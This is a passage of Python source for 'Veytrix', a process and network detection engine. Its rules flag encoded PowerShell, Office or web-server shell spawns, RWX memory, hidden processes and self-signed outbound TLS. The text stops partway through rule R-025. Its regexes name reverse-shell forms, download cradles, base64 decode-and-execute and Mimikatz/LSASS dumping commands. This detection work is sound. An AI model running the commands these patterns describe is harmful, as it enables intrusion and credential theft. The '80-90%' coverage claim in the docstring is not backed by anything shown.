#!/usr/bin/env python3
"""
veytrix_detect.py — Veytrix Advanced Detection Engine (V2)

26 detection rules:
  - 13 pattern rules (cmdline, process names)  [V1]
  - 13 advanced heuristic rules                 [V2 — NEW]

NEW advanced rules detect:
  - Unsigned / masquerading binaries          (custom malware)
  - Wrong parent process chain                (renamed mimikatz)
  - RWX memory / anonymous executable pages   (fileless / injection)
  - Hidden processes                          (rootkit indicator)
  - Kernel modules from suspicious locations  (rootkit)
  - Self-signed TLS certs on outbound         (encrypted C2)
  - Web server spawning shell                 (RCE)
  - Orphaned processes with network           (beaconing artifact)
  - Cross-platform shell spawns               (lateral movement)

Honest truth: 100% detection is impossible. Attackers with root/admin
can evade most heuristics. This catches the 80-90% that slip through
naive pattern matching.

Use:
    python veytrix_detect.py self-test        # prove rules fire
    python veytrix_detect.py scan             # scan your machine
    python veytrix_detect.py scan --json
    python veytrix_detect.py watch            # continuous
    python veytrix_detect.py report --out report.html
    python veytrix_detect.py checks           # which checks ran
"""
from __future__ import annotations

import argparse
import datetime as dt
import hashlib
import html
import json
import os
import platform
import re
import socket
import sqlite3
import ssl
import subprocess
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

VERSION = "2.0.0"
SEVERITIES = ("low", "medium", "high", "critical")
SEV_RANK = {s: i + 1 for i, s in enumerate(SEVERITIES)}
IS_WINDOWS = os.name == "nt"
IS_LINUX = sys.platform.startswith("linux")


# ═════════════════════════════════════════════════════════════════════════════
# Colors
# ═════════════════════════════════════════════════════════════════════════════

class C:
    RED, ORANGE, YELLOW = "\033[91m", "\033[38;5;208m", "\033[93m"
    GREEN, BLUE, CYAN = "\033[92m", "\033[94m", "\033[96m"
    BOLD, DIM, RESET = "\033[1m", "\033[2m", "\033[0m"

SEV_COLOR = {"low": C.GREEN, "medium": C.YELLOW,
             "high": C.ORANGE, "critical": C.RED}


# ═════════════════════════════════════════════════════════════════════════════
# Data classes
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class ProcInfo:
    pid: int
    ppid: int
    name: str
    exe: str
    cmdline: str
    username: str
    create_time: float


@dataclass
class ConnInfo:
    pid: int
    process_name: str
    local_ip: str
    local_port: int
    remote_ip: str
    remote_port: int
    status: str


@dataclass
class Finding:
    rule_id: str
    name: str
    severity: str
    confidence: float
    evidence: list[str]
    technique: str
    affected_pid: Optional[int] = None
    affected_process: str = ""
    remediation: str = ""
    timestamp: str = field(
        default_factory=lambda: dt.datetime.now(dt.timezone.utc).isoformat())
    fingerprint: str = ""

    def __post_init__(self):
        if not self.fingerprint:
            key = f"{self.rule_id}|{self.affected_pid}|{self.affected_process}"
            self.fingerprint = hashlib.sha256(key.encode()).hexdigest()[:16]


# ═════════════════════════════════════════════════════════════════════════════
# System context
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class CheckStatus:
    """Track which checks ran vs. were skipped."""
    name: str
    status: str  # "ran", "skipped", "denied", "failed"
    reason: str = ""


class SystemContext:
    def __init__(self):
        self.processes: list[ProcInfo] = []
        self.connections: list[ConnInfo] = []
        self.procs_by_pid: dict[int, ProcInfo] = {}
        self.conns_by_pid: dict[int, list[ConnInfo]] = {}
        self.own_pid = os.getpid()
        self.scan_time = dt.datetime.now(dt.timezone.utc).isoformat()
        self.checks: list[CheckStatus] = []
        self.raw_proc_pids: set[int] = set()
        self.kernel_modules: list[str] = []
        self.platform = platform.system()
        self.is_admin = self._check_admin()

    @staticmethod
    def _check_admin() -> bool:
        try:
            if IS_WINDOWS:
                import ctypes
                return bool(ctypes.windll.shell32.IsUserAnAdmin())
            return os.geteuid() == 0
        except Exception:
            return False

    def record_check(self, name: str, status: str, reason: str = ""):
        self.checks.append(CheckStatus(name, status, reason))

    @classmethod
    def capture(cls) -> "SystemContext":
        ctx = cls()
        if not HAS_PSUTIL:
            ctx.record_check("psutil", "failed", "psutil not installed")
            return ctx

        # ── processes ──────────────────────────────────────────────────
        try:
            for proc in psutil.process_iter(
                    ["pid", "ppid", "name", "exe", "cmdline",
                     "username", "create_time"]):
                try:
                    info = proc.info
                    p = ProcInfo(
                        pid=int(info["pid"]),
                        ppid=int(info["ppid"] or 0),
                        name=info.get("name") or "",
                        exe=info.get("exe") or "",
                        cmdline=" ".join(info.get("cmdline") or []),
                        username=info.get("username") or "",
                        create_time=float(info.get("create_time") or 0),
                    )
                    ctx.processes.append(p)
                    ctx.procs_by_pid[p.pid] = p
                except (psutil.NoSuchProcess, psutil.AccessDenied,
                        psutil.ZombieProcess):
                    continue
            ctx.record_check("process_iter", "ran")
        except Exception as exc:
            ctx.record_check("process_iter", "failed", str(exc))

        # ── network ────────────────────────────────────────────────────
        try:
            for c in psutil.net_connections(kind="inet"):
                if not c.raddr:
                    continue
                try:
                    pname = psutil.Process(c.pid).name() if c.pid else ""
                except Exception:
                    pname = ""
                conn = ConnInfo(
                    pid=c.pid or 0,
                    process_name=pname,
                    local_ip=c.laddr.ip if c.laddr else "",
                    local_port=c.laddr.port if c.laddr else 0,
                    remote_ip=c.raddr.ip if c.raddr else "",
                    remote_port=c.raddr.port if c.raddr else 0,
                    status=c.status or "",
                )
                ctx.connections.append(conn)
                if conn.pid:
                    ctx.conns_by_pid.setdefault(conn.pid, []).append(conn)
            ctx.record_check("net_connections", "ran")
        except (psutil.AccessDenied, PermissionError) as exc:
            ctx.record_check("net_connections", "denied",
                             "run as admin/root for full coverage")
        except Exception as exc:
            ctx.record_check("net_connections", "failed", str(exc))

        # ── /proc enumeration (Linux only) ─────────────────────────────
        if IS_LINUX:
            try:
                ctx.raw_proc_pids = {
                    int(d) for d in os.listdir("/proc") if d.isdigit()
                }
                ctx.record_check("/proc enumeration", "ran")
            except Exception as exc:
                ctx.record_check("/proc enumeration", "failed", str(exc))

            try:
                with open("/proc/modules") as f:
                    ctx.kernel_modules = [
                        line.split()[0] for line in f if line.strip()
                    ]
                ctx.record_check("/proc/modules", "ran")
            except Exception as exc:
                ctx.record_check("/proc/modules", "denied", str(exc))

        return ctx


# ═════════════════════════════════════════════════════════════════════════════
# Constants
# ═════════════════════════════════════════════════════════════════════════════

SAFE_PARENT_PROCESSES = {
    "svchost.exe", "explorer.exe", "services.exe", "lsass.exe",
    "winlogon.exe", "wininit.exe", "smss.exe", "csrss.exe", "spoolsv.exe",
    "taskhostw.exe", "init", "systemd", "kthreadd", "dbus-daemon",
    "cron", "sshd", "systemd-journal", "systemd-logind",
}

# Expected parent map for Windows system processes
EXPECTED_PARENTS = {
    "svchost.exe": ["services.exe"],
    "lsass.exe": ["wininit.exe"],
    "winlogon.exe": ["smss.exe"],
    "csrss.exe": ["smss.exe"],
    "services.exe": ["wininit.exe"],
    "smss.exe": ["system", "system idle process"],
    "taskhostw.exe": ["svchost.exe"],
    "lsm.exe": ["wininit.exe"],
}

SYSTEM_PROCESS_PATHS = {
    "svchost.exe": "\\windows\\system32\\",
    "lsass.exe": "\\windows\\system32\\",
    "csrss.exe": "\\windows\\system32\\",
    "winlogon.exe": "\\windows\\system32\\",
    "services.exe": "\\windows\\system32\\",
    "smss.exe": "\\windows\\system32\\",
    "wininit.exe": "\\windows\\system32\\",
}

OFFICE_PROCS = {"winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
                "msaccess.exe", "onenote.exe", "visio.exe"}
BROWSER_PROCS = {"chrome.exe", "msedge.exe", "firefox.exe", "brave.exe",
                 "opera.exe", "iexplore.exe", "vivaldi.exe"}
SHELL_PROCS = {"cmd.exe", "powershell.exe", "pwsh.exe", "bash", "sh",
               "zsh", "wscript.exe", "cscript.exe", "mshta.exe",
               "rundll32.exe", "regsvr32.exe", "python", "python3"}
WEB_SERVER_PROCS = {"nginx", "apache2", "httpd", "node", "php-fpm",
                    "java", "tomcat", "uwsgi", "gunicorn", "caddy", "lighttpd"}
JIT_PROCS = {"java", "node", "dotnet", "mono", "python", "python3",
             "chrome", "firefox", "msedge", "code", "electron"}

SUSPICIOUS_DIRS_WIN = ("\\temp\\", "\\tmp\\", "\\appdata\\local\\temp\\",
                       "\\users\\public\\", "\\programdata\\",
                       "\\downloads\\", "\\recycle")
SUSPICIOUS_DIRS_LINUX = ("/tmp/", "/var/tmp/", "/dev/shm/", "/run/user/")

SUSPICIOUS_PORTS = {4444, 5555, 6666, 7777, 8888, 1337, 31337,
                    9001, 9030, 5900, 3389, 23, 12345, 54321}

TRUSTED_LINUX_PREFIXES = ("/usr/bin/", "/usr/sbin/", "/bin/", "/sbin/",
                          "/usr/lib/", "/lib/", "/lib64/", "/usr/lib64/",
                          "/usr/local/")

# ── Pattern regexes ─────────────────────────────────────────────────────────
RE_ENCODED_PS = re.compile(
    r"-(e|en|enc|enco|encod|encode|encodedcommand)\s+[A-Za-z0-9+/=]{20,}", re.I)
RE_HIDDEN = re.compile(
    r"-(w|wi|win|wind|windo|window)\w*\s+hidden|"
    r"-nop\b|-noprofile\b|-executionpolicy\s+bypass|-ep\s+bypass", re.I)
RE_DOWNLOAD = re.compile(
    r"downloadstring|downloadfile|invoke-webrequest|invoke-restmethod|"
    r"net\.webclient|start-bitstransfer|"
    r"\bwget\s+https?:|\bcurl\s+-[a-zA-Z]*[oOsS]?\s*https?:|"
    r"http[s]?://[^\s]+\.(exe|ps1|bat|vbs|dll|scr)", re.I)
RE_BASE64_PIPE = re.compile(
    r"base64\s+(-d|--decode)|\bcertutil\b.*-decode|"
    r"frombase64string|echo\s+[A-Za-z0-9+/=]{20,}\s*\|", re.I)
RE_REVERSE_SHELL = re.compile(
    r"bash\s+-i\s+>&|/dev/tcp/|mkfifo.*nc|"
    r"python[23]?\s+-c\s+.{0,30}socket|"
    r"perl\s+-e\s+.{0,30}socket|"
    r"nc\s+.*\s+-e\s+|ncat\s+.*\s+-e\s+|netcat\s+.*\s+-e\s+", re.I)
RE_MIMIKATZ = re.compile(
    r"mimikatz|sekurlsa|kerberos::|lsadump|invoke-mimikatz|"
    r"procdump.*lsass|comsvcs.*lsass|"
    r"sekurlsa::logonpasswords|sekurlsa::wdigest", re.I)
RE_LSASS_DUMP = re.compile(
    r"\blsass\b.*\b(dump|procdump|mini)|"
    r"procdump.*\blsass\b|rundll32.*comsvcs.*mini", re.I)


# ═════════════════════════════════════════════════════════════════════════════
# Advanced helpers
# ═════════════════════════════════════════════════════════════════════════════

def check_binary_signature(path: str, ctx: SystemContext) -> str:
    """Return 'trusted', 'untrusted', or 'unknown'."""
    if not path or not os.path.exists(path):
        return "unknown"
    try:
        if IS_WINDOWS:
            return _check_win_signature(path)
        elif IS_LINUX:
            return _check_linux_binary(path)
    except Exception:
        pass
    return "unknown"


def _check_win_signature(path: str) -> str:
    """Heuristic: files in System32/SysWOW64 are assumed signed (fast)."""
    pl = path.lower()
    if ("\\windows\\system32\\" in pl or "\\windows\\syswow64\\" in pl
            or "\\program files\\" in pl or "\\program files (x86)\\" in pl):
        return "trusted"
    return "unknown"


def _check_linux_binary(path: str) -> str:
    """Heuristic: binaries in package-managed prefixes are trusted."""
    for prefix in TRUSTED_LINUX_PREFIXES:
        if path.startswith(prefix):
            return "trusted"
    return "untrusted"


def check_rwx_memory(pid: int) -> list[str]:
    """Return lines from /proc/pid/maps with rwx permission."""
    if not IS_LINUX:
        return []
    try:
        hits = []
        with open(f"/proc/{pid}/maps") as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 2 and "rwx" in parts[1]:
                    hits.append(line.strip())
        return hits
    except (FileNotFoundError, PermissionError, ProcessLookupError):
        return []


def check_anonymous_exec_memory(pid: int) -> list[str]:
    """Return executable memory mappings with no backing file."""
    if not IS_LINUX:
        return []
    try:
        hits = []
        with open(f"/proc/{pid}/maps") as f:
            for line in f:
                parts = line.split()
                if len(parts) < 2:
                    continue
                perms = parts[1]
                # Executable but no file path (or [stack], [heap])
                path = " ".join(parts[5:]) if len(parts) > 5 else ""
                if "x" in perms and not path.strip():
                    hits.append(line.strip())
                elif "x" in perms and any(
                        m in path for m in ("[heap]", "[stack]", "memfd:")):
                    hits.append(line.strip())
        return hits
    except (FileNotFoundError, PermissionError, ProcessLookupError):
        return []


def check_tls_cert(ip: str, port: int, timeout: float = 2.0
                   ) -> Optional[dict]:
    """Grab TLS cert and return metadata, or None if can't connect."""
    if not HAS_CRYPTO:
        return None
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            with context.wrap_socket(sock, server_hostname=ip) as tls:
                der = tls.getpeercert(binary_form=True)
                if not der:
                    return None
        cert = x509.load_der_x509_certificate(der)
        return {
            "self_signed": cert.issuer == cert.subject,
            "expired": cert.not_valid_after_utc < dt.datetime.now(dt.timezone.utc),
            "issuer": _name_to_str(cert.issuer),
            "subject": _name_to_str(cert.subject),
            "san": _get_san(cert),
        }
    except Exception:
        return None


def _name_to_str(name) -> str:
    try:
        parts = []
        for attr in name:
            parts.append(f"{attr.oid._name}={attr.value}")
        return ", ".join(parts)
    except Exception:
        return str(name)


def _get_san(cert) -> list[str]:
    try:
        ext = cert.extensions.get_extension_for_class(
            x509.SubjectAlternativeName)
        return ext.value.get_values_for_type(x509.DNSName)
    except Exception:
        return []


def get_kernel_module_path(module: str) -> str:
    if not IS_LINUX:
        return ""
    try:
        result = subprocess.run(
            ["modinfo", "-F", "filename", module],
            capture_output=True, text=True, timeout=2)
        return result.stdout.strip()
    except Exception:
        return ""


# ═════════════════════════════════════════════════════════════════════════════
# V1 PATTERN RULES (13)
# ═════════════════════════════════════════════════════════════════════════════

def rule_encoded_powershell(ctx: SystemContext) -> list[Finding]:
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or "powershell" not in p.name.lower():
            if "pwsh" not in p.name.lower():
                continue
        if RE_ENCODED_PS.search(p.cmdline):
            out.append(Finding(
                "R-001", "Encoded PowerShell Command", "high", 0.85,
                [f"PID {p.pid} ({p.name})",
                 f"Command: {p.cmdline[:300]}"],
                "T1059.001", p.pid, p.name,
                "Decode Base64 payload and check network egress."))
    return out


def rule_hidden_execution(ctx: SystemContext) -> list[Finding]:
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if not any(s in p.name.lower() for s in
                   ("powershell", "pwsh", "cmd", "wscript", "cscript")):
            continue
        if RE_HIDDEN.search(p.cmdline):
            out.append(Finding(
                "R-002", "Hidden Window / Execution Policy Bypass",
                "medium", 0.7,
                [f"PID {p.pid} ({p.name})",
                 f"Command: {p.cmdline[:300]}"],
                "T1564.003", p.pid, p.name,
                "Review parent process and network activity."))
    return out


def rule_download_cradle(ctx: SystemContext) -> list[Finding]:
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_DOWNLOAD.search(p.cmdline):
            out.append(Finding(
                "R-003", "Download Cradle Detected", "high", 0.75,
                [f"PID {p.pid} ({p.name})",
                 f"Command: {p.cmdline[:300]}"],
                "T1105", p.pid, p.name,
                "Block the URL at egress and check if payload ran."))
    return out


def rule_office_spawns_shell(ctx: SystemContext) -> list[Finding]:
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or p.name.lower() not in SHELL_PROCS:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if parent and parent.name.lower() in OFFICE_PROCS:
            out.append(Finding(
                "R-004", "Office Application Spawned Shell", "critical", 0.9,
                [f"Parent: {parent.name} (PID {parent.pid})",
                 f"Child: {p.name} (PID {p.pid})",
                 f"Command: {p.cmdline[:300]}"],
                "T1566.001", p.pid, p.name,
                "Isolate host, capture memory, inspect source document."))
    return out


def rule_browser_spawns_shell(ctx: SystemContext) -> list[Finding]:
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or p.name.lower() not in SHELL_PROCS:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if parent and parent.name.lower() in BROWSER_PROCS:
            out.append(Finding(
                "R-005", "Browser Spawned Shell", "high", 0.8,
                [f"Parent: {parent.name} (PID {parent.pid})",
                 f"Child: {p.name} (PID {p.pid})"],
                "T1189", p.pid, p.name,
                "Possible drive-by. Check browser version and downloads."))
    return out


def rule_suspicious_location(ctx: SystemContext) -> list[Finding]:
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or not p.exe:
            continue
        exe_lower = p.exe.lower()
        if (any(d in exe_lower for d in SUSPICIOUS_DIRS_WIN)
                or any(exe_lower.startswith(d) for d in SUSPICIOUS_DIRS_LINUX)):
            out.append(Finding(
                "R-006", "Executable in Suspicious Location",
                "high", 0.75,
                [f"PID {p.pid} ({p.name})", f"Path: {p.exe}"],
                "T1036", p.pid, p.name,
                "Verify file hash on VirusTotal."))
    return out


def rule_credential_access(ctx: SystemContext) -> list[Finding]:
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_MIMIKATZ.search(p.cmdline) or "mimikatz" in p.name.lower():
            out.append(Finding(
                "R-007", "Credential Access Tool", "critical", 0.95,
                [f"PID {p.pid} ({p.name})",
                 f"Command: {p.cmdline[:300]}"],
                "T1003.001", p.pid, p.name,
                "IMMEDIATE: isolate host, rotate ALL credentials."))
    return out


def rule_lsass_access(ctx: SystemContext) -> list[Finding]:
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_LSASS_DUMP.search(p.cmdline):
            out.append(Finding(
                "R-008", "LSASS Memory Dump Pattern",
                "critical", 0.9,
                [f"PID {p.pid} ({p.name})",
                 f"Command: {p.cmdline[:300]}"],
                "T1003.001", p.pid, p.name,
                "IMMEDIATE: rotate credentials, forensics."))
    return out


def rule_reverse_shell(ctx: SystemContext) -> list[Finding]:
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_REVERSE_SHELL.search(p.cmdline):
            out.append(Finding(
                "R-009", "Reverse Shell Pattern", "critical", 0.9,
                [f"PID {p.pid} ({p.name})",
                 f"Command: {p.cmdline[:300]}"],
                "T1059", p.pid, p.name,
                "Kill process, block remote IP, investigate entry."))
    return out


def rule_base64_pipe(ctx: SystemContext) -> list[Finding]:
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_BASE64_PIPE.search(p.cmdline):
            out.append(Finding(
                "R-010", "Base64 Decode-and-Execute",
                "high", 0.8,
                [f"PID {p.pid} ({p.name})",
                 f"Command: {p.cmdline[:300]}"],
                "T1027", p.pid, p.name,
                "Capture cmdline, decode payload manually."))
    return out


def rule_suspicious_port(ctx: SystemContext) -> list[Finding]:
    out = []
    for c in ctx.connections:
        if c.remote_port in SUSPICIOUS_PORTS:
            out.append(Finding(
                "R-011", f"Suspicious Port {c.remote_port}",
                "high", 0.7,
                [f"Process: {c.process_name} (PID {c.pid})",
                 f"{c.local_ip}:{c.local_port} → "
                 f"{c.remote_ip}:{c.remote_port}"],
                "T1571", c.pid, c.process_name,
                f"Port {c.remote_port} used by C2. Block the IP."))
    return out


def rule_beaconing(ctx: SystemContext) -> list[Finding]:
    out = []
    for pid, conns in ctx.conns_by_pid.items():
        if pid == ctx.own_pid or len(conns) < 3:
            continue
        counts: dict[str, int] = {}
        for c in conns:
            counts[c.remote_ip] = counts.get(c.remote_ip, 0) + 1
        for ip, count in counts.items():
            if count >= 3:
                out.append(Finding(
                    "R-012", f"Beaconing to {ip}", "medium", 0.6,
                    [f"Process: {conns[0].process_name} (PID {pid})",
                     f"{count} connections to {ip}"],
                    "T1071", pid, conns[0].process_name,
                    "Repeated connections may be C2 beaconing."))
    return out


def rule_masquerading_name(ctx: SystemContext) -> list[Finding]:
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or not p.exe:
            continue
        name = p.name.lower()
        if name in SYSTEM_PROCESS_PATHS:
            expected = SYSTEM_PROCESS_PATHS[name]
            if expected not in p.exe.lower().replace("/", "\\"):
                out.append(Finding(
                    "R-013", f"Masquerading Name ({name})",
                    "critical", 0.85,
                    [f"PID {p.pid} ({p.name})", f"Path: {p.exe}",
                     f"Expected path contains: {expected}"],
                    "T1036.005", p.pid, p.name,
                    "System name from wrong path — investigate."))
    return out


# ═════════════════════════════════════════════════════════════════════════════
# V2 ADVANCED HEURISTIC RULES (13 NEW)
# ═════════════════════════════════════════════════════════════════════════════

def rule_unsigned_binary(ctx: SystemContext) -> list[Finding]:
    """R-014: Executable not from trusted location/signature."""
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or not p.exe:
            continue
        # Skip if already in temp rule
        exe_lower = p.exe.lower()
        if any(d in exe_lower for d in SUSPICIOUS_DIRS_WIN):
            continue
        status = check_binary_signature(p.exe, ctx)
        if status == "untrusted":
            out.append(Finding(
                "R-014", "Unsigned / Untrusted Binary Running",
                "medium", 0.6,
                [f"PID {p.pid} ({p.name})",
                 f"Path: {p.exe}",
                 "Not in a package-managed or signed location",
                 "May indicate custom / 0-day malware"],
                "T1553.002", p.pid, p.name,
                "Verify file hash and origin. If unusual, quarantine."))
    return out


def rule_wrong_parent_chain(ctx: SystemContext) -> list[Finding]:
    """R-015: System process with unexpected parent (e.g. renamed mimikatz)."""
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        name = p.name.lower()
        if name not in EXPECTED_PARENTS:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if not parent:
            continue
        expected = [x.lower() for x in EXPECTED_PARENTS[name]]
        if parent.name.lower() not in expected:
            out.append(Finding(
                "R-015", f"Wrong Parent for {p.name}",
                "high", 0.8,
                [f"PID {p.pid} ({p.name})",
                 f"Expected parent: {', '.join(expected)}",
                 f"Actual parent: {parent.name} (PID {parent.pid})",
                 "Classic masquerading indicator"],
                "T1036.005", p.pid, p.name,
                "Investigate — this process should not exist here."))
    return out


def rule_rwx_memory(ctx: SystemContext) -> list[Finding]:
    """R-016: Process with RWX memory pages (shellcode / injection)."""
    if not IS_LINUX:
        ctx.record_check("rwx_memory", "skipped",
                         "Linux only — Windows needs VirtualQueryEx")
        return []
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        hits = check_rwx_memory(p.pid)
        if hits:
            out.append(Finding(
                "R-016", "RWX Memory in Process",
                "high", 0.65,
                [f"PID {p.pid} ({p.name})",
                 f"RWX mapping: {hits[0][:150]}",
                 "Read+Write+Execute pages often hold shellcode"],
                "T1055", p.pid, p.name,
                "Possible code injection. Dump memory, forensics."))
    return out


def rule_anonymous_exec_memory(ctx: SystemContext) -> list[Finding]:
    """R-017: Anonymous executable memory (fileless / reflective loading)."""
    if not IS_LINUX:
        ctx.record_check("anon_exec", "skipped", "Linux only")
        return []
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        # Skip known JIT engines
        if any(j in p.name.lower() for j in JIT_PROCS):
            continue
        hits = check_anonymous_exec_memory(p.pid)
        if hits:
            out.append(Finding(
                "R-017", "Anonymous Executable Memory",
                "high", 0.7,
                [f"PID {p.pid} ({p.name})",
                 f"Maps: {hits[0][:150]}",
                 "Executable memory with no backing file — common in fileless"],
                "T1055", p.pid, p.name,
                "Likely fileless attack. Memory forensics required."))
    return out


def rule_orphaned_with_network(ctx: SystemContext) -> list[Finding]:
    """R-018: Process whose parent is dead but still has network."""
    out = []
    for pid, conns in ctx.conns_by_pid.items():
        if pid == ctx.own_pid:
            continue
        p = ctx.procs_by_pid.get(pid)
        if not p or not conns:
            continue
        if p.ppid and p.ppid not in ctx.procs_by_pid and p.ppid != 1:
            out.append(Finding(
                "R-018", "Orphaned Process with Network",
                "medium", 0.6,
                [f"PID {pid} ({p.name})",
                 f"Parent {p.ppid} is dead",
                 f"Active connections: {len(conns)}",
                 "Orphaning is common in droppers"],
                "T1564", pid, p.name,
                "Check how parent died and what child is doing."))
    return out


def rule_hidden_process(ctx: SystemContext) -> list[Finding]:
    """R-019: Process in /proc not visible via psutil (rootkit indicator)."""
    if not IS_LINUX or not ctx.raw_proc_pids:
        return []
    out = []
    psutil_pids = set(ctx.procs_by_pid.keys())
    hidden = ctx.raw_proc_pids - psutil_pids
    for pid in hidden:
        try:
            with open(f"/proc/{pid}/comm") as f:
                comm = f.read().strip()
            out.append(Finding(
                "R-019", "Hidden Process (Rootkit Indicator)",
                "high", 0.8,
                [f"PID {pid} visible in /proc but not in psutil",
                 f"comm: {comm}",
                 "Possible rootkit / DKOM"],
                "T1014", pid, comm,
                "Rootkit indicator. Full forensics recommended."))
        except Exception:
            continue
    return out


def rule_suspicious_kernel_module(ctx: SystemContext) -> list[Finding]:
    """R-020: Kernel module loaded from temp/suspicious location."""
    if not IS_LINUX or not ctx.kernel_modules:
        return []
    out = []
    suspicious = ("/tmp/", "/var/tmp/", "/dev/shm/", "/home/")
    for module in ctx.kernel_modules:
        path = get_kernel_module_path(module)
        if not path:
            continue
        if any(path.startswith(prefix) for prefix in suspicious):
            out.append(Finding(
                "R-020", f"Kernel Module from Suspicious Location",
                "critical", 0.9,
                [f"Module: {module}",
                 f"Path: {path}",
                 "Legitimate modules live in /lib/modules/"],
                "T1014", None, module,
                "IMMEDIATE: possible rootkit. Full forensics."))
    return out


def rule_self_signed_tls(ctx: SystemContext) -> list[Finding]:
    """R-021: Self-signed / expired TLS cert on outbound connection."""
    if not HAS_CRYPTO:
        ctx.record_check("tls_cert", "skipped",
                         "cryptography not installed")
        return []
    out = []
    checked_ips: set[tuple[str, int]] = set()
    for c in ctx.connections:
        if c.remote_port not in (443, 8443) or not c.remote_ip:
            continue
        # Skip internal / private ranges
        if c.remote_ip.startswith(("10.", "172.", "192.168.", "127.",
                                   "169.254.", "0.0.0.0")):
            continue
        key = (c.remote_ip, c.remote_port)
        if key in checked_ips:
            continue
        checked_ips.add(key)
        info = check_tls_cert(c.remote_ip, c.remote_port)
        if not info:
            continue
        if info["self_signed"]:
            out.append(Finding(
                "R-021", f"Self-Signed TLS on Outbound",
                "high", 0.7,
                [f"Process: {c.process_name} (PID {c.pid})",
                 f"Destination: {c.remote_ip}:{c.remote_port}",
                 f"Issuer: {info['issuer']}",
                 "Legitimate services use CA-signed certs"],
                "T1573.002", c.pid, c.process_name,
                "Possible C2 over HTTPS. Investigate process."))
        elif info["expired"]:
            out.append(Finding(
                "R-021", f"Expired TLS on Outbound",
                "medium", 0.55,
                [f"Process: {c.process_name} (PID {c.pid})",
                 f"Destination: {c.remote_ip}:{c.remote_port}",
                 "Certificate expired — suspicious for production services"],
                "T1573.002", c.pid, c.process_name,
                "May indicate hijacked or C2 endpoint."))
    ctx.record_check("tls_cert", "ran")
    return out


def rule_web_server_spawns_shell(ctx: SystemContext) -> list[Finding]:
    """R-022: Web server spawning shell (RCE / web shell)."""
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or p.name.lower() not in SHELL_PROCS:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if parent and parent.name.lower() in WEB_SERVER_PROCS:
            out.append(Finding(
                "R-022", "Web Server Spawned Shell",
                "critical", 0.9,
                [f"Parent: {parent.name} (PID {parent.pid})",
                 f"Child: {p.name} (PID {p.pid})",
                 f"Command: {p.cmdline[:300]}",
                 "Web servers should never spawn shells"],
                "T1505.003", p.pid, p.name,
                "Possible web shell / RCE. Isolate and inspect logs."))
    return out


def rule_cross_platform_spawn(ctx: SystemContext) -> list[Finding]:
    """R-023: Cross-platform shell spawn (Linux bash spawning cmd.exe)."""
    out = []
    linux_shells = {"bash", "sh", "zsh", "fish"}
    win_shells = {"powershell.exe", "cmd.exe", "pwsh.exe"}
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if not parent:
            continue
        pn, cn = parent.name.lower(), p.name.lower()
        if pn in linux_shells and cn in win_shells:
            out.append(Finding(
                "R-023", "Cross-Platform Shell Spawn",
                "medium", 0.7,
                [f"Parent: {parent.name} (Linux shell)",
                 f"Child: {p.name} (Windows shell)",
                 "Unusual on either OS"],
                "T1059", p.pid, p.name,
                "Investigate — likely lateral movement or tool test."))
        elif pn in win_shells and cn in linux_shells and IS_WINDOWS:
            out.append(Finding(
                "R-023", "Cross-Platform Shell Spawn",
                "medium", 0.7,
                [f"Parent: {parent.name} (Windows shell)",
                 f"Child: {p.name} (Linux shell)"],
                "T1059", p.pid, p.name,
                "Investigate."))
    return out


def rule_suspicious_child_of_browser_jit(ctx: SystemContext) -> list[Finding]:
    """R-024: Browser / JIT process spawning suspicious child."""
    out = []
    suspicious_children = {"curl", "wget", "nc", "ncat", "netcat",
                            "powershell.exe", "cmd.exe", "bash", "sh"}
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if not parent:
            continue
        if (parent.name.lower() in BROWSER_PROCS
                and p.name.lower() in suspicious_children):
            out.append(Finding(
                "R-024", "Browser Spawned Suspicious Child",
                "high", 0.75,
                [f"Parent: {parent.name}",
                 f"Child: {p.name}",
                 f"Command: {p.cmdline[:200]}"],
                "T1189", p.pid, p.name,
                "Drive-by or malicious extension."))
    return out


def rule_memfd_or_deleted_binary(ctx: SystemContext) -> list[Finding]:
    """R-025: Binary has been deleted from disk but still running (Linux)."""
    if not IS_LINUX:
        return []
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or not p.exe:
            continue
        try:
            link = os.readlink(f"/proc/{p.pid}/exe")
            if " (deleted)" in link or link.startswith("/memfd:"):
                out.append(Finding(
                    "R-025", "Running Binary Deleted from Disk",
                    "high", 0.8,
                    [f"PID {p.pid} ({p.name})",
                     f"Exe: {link}",
                     "Deleted / memfd binaries are common in evasion"],
                    "T1070.004", p.pid, p.name,
